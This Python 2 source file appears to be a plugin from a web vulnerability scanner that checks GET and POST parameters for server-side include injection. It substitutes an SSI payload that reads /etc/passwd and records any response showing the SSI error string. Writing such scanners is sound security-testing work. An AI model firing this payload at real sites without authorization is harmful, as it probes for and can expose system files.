#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
import urllib
import json

def run_url(http,ob,item):
    try:
        result = []
        url = item['url']
        if item['params'] == "":
            return result
        #end if
        detail = ""
        if item['method'] == 'get':  #year1=20120923&year2=20130923
            params_dict = None
            try:
                params_dict = dict(map(lambda s: s.split('='),item['params'].split('&')))  #params may "&page=&no=3249"
            except:
                return result
            for row in params_dict:
                tmp = params_dict.copy()
                tmp[row] = '<!--#include%20file="/etc/passwd"-->'
                ret = []
                for k in tmp:
                    ret.append(k+"="+tmp[k])
                new_url = "%s?%s" %(url, '&'.join(ret))
                opener = urllib.urlopen(new_url)
                content = opener.read()
                opener.close()
                if content.find("[an error occurred while processing this directive]") >= 0:
                    request = getRequest(new_url)
                    res = opener.headers.dict
                    res['status']='403'
                    response = getResponse(res)
                    output = content
                    result.append(getRecord(ob,new_url,ob['level'],detail,request,response,output))
                    break
                #end if
            #end for
                
        elif item['method'] == 'post': #[{"type":"hidden","name":"num","value":""},{"type":"hidden","name":"asu","value":""}]
            params_list = json.read(item['params'])
            params = []
            for params_dict in params_list:
                params.append((params_dict['name'],params_dict['value']))
            #end for
            params_dict = dict(params)
            for row in params_dict:
                tmp = params_dict.copy()
                tmp[row] = '<!--#include file="/etc/passwd"-->'
                data = urllib.urlencode(tmp)
                opener = urllib.urlopen(url,data)
                content = opener.read()
                opener.close()
                if content.find("[an error occurred while processing this directive]") >= 0:
                    request = postRequest(url,data=data)
                    res = opener.headers.dict
                    res['status']='403'
                    response = getResponse(res)
                    output = content
                    result.append(getRecord(ob,url,ob['level'],detail,request,response,output))
                    break
                #end if
            #end for      
        #end if
        return result
        
        
    except Exception,e:
        logging.getLogger().error("File:ServerDirectiveRetrival.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'] + ", url:" + item['url'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ServerDirectiveRetrival.py, run_url function :" + str(e)+ ", url:" + item['url'])
        return []
    #end try    
#end def

